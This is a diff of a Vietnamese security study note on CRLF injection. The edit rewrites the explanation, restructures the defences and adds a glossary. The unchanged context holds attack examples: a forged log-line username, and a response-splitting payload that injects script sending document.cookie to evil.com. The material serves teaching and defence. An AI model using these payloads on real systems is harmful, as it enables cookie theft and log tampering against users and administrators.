@@ -1,17 +1,10 @@
 # CRLF Injection
 
-> **OWASP Top 10:2025**: A05:2025 – Injection | **CWE**: CWE-93 | **Nguồn**: PortSwigger, OWASP, CWE MITRE
+> **CWE**: CWE-93 | **Phân loại**: Injection
 
-## 🧱 Kiến thức Nền tảng
+## Kiến thức Nền tảng
 
-Giao thức HTTP sử dụng cặp ký tự **CRLF** (`\r\n` — Carriage Return + Line Feed, mã ASCII 13 và 10) làm ký tự phân tách giữa các header và giữa header với body trong HTTP response. Khi server gửi phản hồi cho client, cấu trúc luôn tuân theo quy tắc:
-
-- Mỗi header kết thúc bằng `\r\n`
-- Header và body phân tách bởi `\r\n\r\n` (một dòng trống)
-
-Tương tự, hệ thống logging thường ghi mỗi sự kiện trên một dòng, phân tách bằng newline (`\n`). Nếu ứng dụng chèn dữ liệu người dùng trực tiếp vào HTTP header hoặc log file mà không loại bỏ ký tự CRLF, attacker có thể kiểm soát cấu trúc output.
-
-Ví dụ một HTTP response bình thường:
+Hãy tưởng tượng giao thức HTTP giống như một bức thư được viết theo quy chuẩn nghiêm ngặt: mỗi dòng thông tin (như tiêu đề thư, người gửi, người nhận) phải được xuống dòng rõ ràng. Để báo hiệu việc xuống dòng này, trình duyệt và máy chủ sử dụng một cặp ký tự đặc biệt gọi là CRLF (viết tắt của Carriage Return và Line Feed, ký hiệu là `\r\n`). Khi nhận được bức thư, máy chủ cứ thấy CRLF là biết cần bắt đầu một dòng mới, và khi thấy hai cặp CRLF liên tiếp (`\r\n\r\n`), nó hiểu rằng phần tiêu đề đã hết và phần nội dung chính của bức thư bắt đầu. Tương tự, các hệ thống ghi nhật ký (log) cũng dùng ký tự xuống dòng để phân biệt các sự kiện khác nhau.
 
 ```http
 # Normal HTTP response structure
@@ -37,15 +30,11 @@ def do_redirect():
     return redirect(dest)
 ```
 
-## 🔍 Mô tả lỗ hổng
+## Mô tả lỗ hổng
 
-CRLF Injection xảy ra khi attacker chèn ký tự `\r\n` vào dữ liệu đầu vào mà ứng dụng sử dụng để xây dựng HTTP response header hoặc ghi log. Hậu quả bao gồm:
+Lỗ hổng CRLF Injection xuất hiện khi ứng dụng cho phép người dùng điền thông tin vào tiêu đề thư nhưng lại không kiểm tra xem họ có lén chèn thêm các ký tự xuống dòng `\r\n` hay không. Việc này giống như kẻ xấu cố tình viết chữ "Xuống dòng" và tự tạo ra một dòng mới trong bức thư chính thức của bạn. Bằng cách tự tạo ra các dòng mới này, kẻ tấn công có thể chèn thêm các tiêu đề giả mạo (như Set-Cookie để cố định phiên đăng nhập), hoặc thậm chí tạo hẳn một trang web giả mạo nằm ngay trong phần nội dung phản hồi (HTTP Response Splitting). Điều này rất nguy hiểm vì nó có thể đánh lừa trình duyệt thực thi mã JavaScript độc hại (XSS), làm sai lệch nhật ký hệ thống để che giấu vết tích, hoặc đầu độc bộ nhớ đệm (cache poisoning) của những người dùng khác.
 
-- **HTTP Response Splitting**: Chèn header giả mạo hoặc thậm chí tạo response body hoàn toàn mới, dẫn đến XSS, cache poisoning.
-- **Log Injection**: Chèn dòng log giả mạo, gây nhầm lẫn cho quản trị viên khi phân tích sự cố.
-- **Header Injection**: Thêm các header độc hại như `Set-Cookie` để cố định phiên (session fixation).
-
-## ⚔️ Cơ chế tấn công
+## Cơ chế tấn công
 
 **HTTP Response Splitting** — Attacker chèn CRLF vào tham số redirect để inject header mới:
 
@@ -78,15 +67,17 @@ username = "admin\nINFO: Login successful for user admin from 10.0.0.1"
 url=%0d%0a%0d%0a<script>document.location='https://evil.com/?c='+document.cookie</script>
 ```
 
-## 🛡️ Biện pháp phòng thủ
+## Biện pháp phòng thủ
 
-1. **Loại bỏ hoặc encode ký tự CRLF**: Strip tất cả `\r` và `\n` khỏi input trước khi sử dụng trong header hoặc log.
-2. **Sử dụng framework hiện đại**: Hầu hết framework mới (Django, Express, Spring) tự động reject header chứa CRLF.
-3. **URL-encode output**: Khi chèn user input vào Location header, luôn encode đúng cách.
-4. **Validate log input**: Thay thế newline bằng ký tự an toàn hoặc encode trước khi ghi log.
-5. **WAF rules**: Cấu hình Web Application Firewall phát hiện pattern `%0d%0a` trong request.
+- **Tóm tắt**: Loại bỏ hoặc mã hóa các ký tự xuống dòng (CRLF) trước khi đưa vào tiêu đề phản hồi hoặc ghi nhật ký hệ thống.
+- **Các bước chi tiết**:
+  - Loại bỏ hoặc encode ký tự CRLF: Strip tất cả `\r` và `\n` khỏi input trước khi sử dụng trong header hoặc log.
+  - Sử dụng framework hiện đại: Hầu hết framework mới (Django, Express, Spring) tự động reject header chứa CRLF.
+  - URL-encode output: Khi chèn user input vào Location header, luôn encode đúng cách.
+  - Validate log input: Thay thế newline bằng ký tự an toàn hoặc encode trước khi ghi log.
+  - WAF rules: Cấu hình Web Application Firewall phát hiện pattern `%0d%0a` trong request.
 
-## 💻 Code Example
+## Code Example
 
 ```python
 # === VULNERABLE CODE ===
@@ -132,8 +123,20 @@ def set_language():
     return response
 ```
 
-## 📚 Nguồn tham khảo
+## Xem thêm
+
+- [Web Cache Poisoning](../../08-data-integrity-failures/web-cache-poisoning/) — Lỗ hổng đầu độc bộ nhớ đệm web, thường tận dụng kỹ thuật chèn header thông qua CRLF Injection để đầu độc cache response.
+
+## Nguồn tham khảo
 
 - PortSwigger: https://portswigger.net/web-security/request-smuggling/advanced/response-splitting
 - OWASP: https://owasp.org/www-community/vulnerabilities/CRLF_Injection
 - CWE: https://cwe.mitre.org/data/definitions/93.html
+
+## Giải thích thuật ngữ
+
+- **CRLF**: Cặp ký tự xuống dòng (Carriage Return + Line Feed), ký hiệu là `\r\n`.
+- **HTTP Response Splitting**: Cuộc tấn công chia tách phản hồi HTTP bằng cách chèn CRLF để tạo ra phản hồi giả.
+- **Session Fixation**: Tấn công cố định phiên, kẻ xấu ép nạn nhân sử dụng session ID định sẵn để chiếm đoạt tài khoản sau đó.
+- **Cache Poisoning**: Đầu độc bộ nhớ đệm của proxy hoặc trình duyệt để phân phối nội dung giả mạo.
+- **Log Injection**: Tiêm dòng log giả mạo vào file nhật ký hệ thống nhằm che giấu hành vi hoặc đánh lừa quản trị viên.
